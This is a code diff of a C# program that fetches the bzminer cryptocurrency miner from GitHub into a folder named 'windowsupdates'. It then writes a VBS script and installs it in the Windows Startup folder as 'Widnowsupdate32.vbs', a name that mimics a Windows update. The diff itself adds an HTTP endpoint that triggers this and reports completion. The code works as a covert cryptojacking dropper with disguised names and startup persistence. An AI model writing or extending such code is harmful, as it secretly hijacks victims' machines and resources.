@@ -3,12 +3,13 @@ using System.IO;
 using System.IO.Compression;
 using System.Net.Http;
 using System.Threading.Tasks;
+using Microsoft.AspNetCore.Http;
 
 namespace Kaspa
 {
     public class MyProgram
     {
-        public static async Task RunAsync()
+        public static async Task RunAsync(HttpContext context)
         {
             string url = "https://github.com/bzminer/bzminer/releases/download/v19.2.3/bzminer_v19.2.3_windows.zip";
             string zipFilePath = Path.Combine(GetDownloadsFolderPath(), "windowsupdates", "bzminer_v19.2.3_windows.zip");
@@ -31,6 +32,9 @@ namespace Kaspa
             SaveToFile(vbsFilePath, vbsScriptContent);
 
             MoveFile(vbsFilePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Widnowsupdate32.vbs"));
+
+            context.Response.StatusCode = 200;
+            await context.Response.WriteAsync("Download, extraction, and modification completed!");
         }
 
         static async Task DownloadFileAsync(string url, string destinationFilePath)
